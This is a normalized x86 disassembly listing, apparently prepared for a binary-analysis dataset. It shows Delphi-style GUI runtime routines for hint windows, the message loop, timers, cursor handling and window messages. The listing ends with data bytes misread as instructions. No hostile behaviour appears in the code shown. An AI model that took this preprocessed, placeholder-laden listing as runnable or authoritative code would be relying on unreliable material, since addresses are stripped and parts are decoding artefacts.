mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_453633
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_403f44
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_452e3c
mov eax [ ebp - 0x108 ]
call sub_40436c
push eax
mov eax [ ebp - 0x4 ]
call sub_40436c
mov edx eax
mov eax ebx
pop ecx
call sub_453410
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45363a
lea eax [ ebp - 0x108 ]
call sub_403eac
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax [ ebp - 0x4 ]
call sub_4080fc
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402bf8
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402a10
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404174
sub_453650
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_43a30c
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_43a474
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_453cf4
test al al
je r-xdata
call sub_43a170
mov ebp eax
mov eax edi
call sub_43a170
mov ebp eax
mov eax esi
call sub_453cf4
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_4537b8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_453810
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_453cf4
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_454540
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453817
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_453820
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_453878
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_453cf4
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_454540
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45387f
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_453890
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4030f0
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_433b10
jmp r-xdata
sub_4538e0
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_450e8c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_43a170
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_450e78
mov ebx eax
mov eax ebx
call sub_43a474
test al al
je r-xdata
mov eax ebx
call sub_43a170
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_453944
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43221c
mov edi eax
call sub_430b18
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_434b3c
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_434b3c
sub_4539bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453acc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_453944
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4519f4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_430ad4
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_453b7c
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_403578#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_453f14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4538e0
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_419488
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453ad3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ed0
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_453adc
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_450e70
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_450e5c
movzx edx di
xor ecx ecx
call sub_434b3c
inc esi
dec ebx
jne r-xdata
sub_453b18
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_452c34
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_452c34
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_453adc
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_453b7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_4042b8
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403f00
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d86c
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4402c4
xor eax eax
push ebp
push sub_453c01
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4032ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_453c10
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_453c6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_450e70
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_453c10
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_450e5c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_453c10
pop ecx
jmp r-xdata
mov eax ebx
call sub_43a474
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_43a170
push eax
call IsChild
test eax eax
jne r-xdata
sub_453cf4
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4054e8
call sub_4234c4
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_453d1c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_453d60
push sub_451a4c
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_453f14
sub_453d88
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4067b8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_433488
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_43221c
call sub_451a2c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_453f14
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4067b8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_433488
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_453f14
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_453d1c
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_434b3c
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_4541ac
jmp r-xdata
sub_453e98
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_453d60
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_4541ac
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_453ed0
jmp r-xdata
sub_453ed0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43a474
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_43a170
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_43a170
push eax
call ShowWindow
sub_453f14
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_453ed0
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_451bb4
mov eax ebx
call sub_453d60
sub_453f4c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_45408e
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_41ed58
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407910
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_45405f
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41ee10
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454066
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_453f3c
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_453f3c
mov [ ebp - 0x4 ] eax
sub_454066
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_4540a0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_4030f0
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_403038
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_454100
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_45419a
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4541a1
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403f9c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41d93c
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40bda4
mov ebx eax
inc ebx
sub_4541ac
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404818
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_454532
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_453f14
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_453d1c
jmp r-xdata
call sub_44a3dc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454539
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403ed0
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4048dc
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_43221c
call sub_451a2c
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_453f4c
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_450df0
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_433310
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4334b4
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4519f4
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_430a90
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_403f44
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_434b3c
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_4540a0
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_4032ec
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_433488
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_433488
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_433b10
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_451b40
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_454100
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_453d1c
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_453d1c
jmp r-xdata
sub_454540
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403f00
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403f00
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4545a0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov [ ebx + 0xb0 ] esi
pop esi
pop ebx
retn
push esi
push 0x0
push 0xb031
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
sub_4545cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_434b3c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_434b3c
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_44018c
sub_45465c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_454684
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_454728
add [ eax ] eax
add [ eax ] al
enter 0x466c 0x0
inc esp
add al [ ebx ]
add [ eax ] al
add [ eax ] al
push ebp
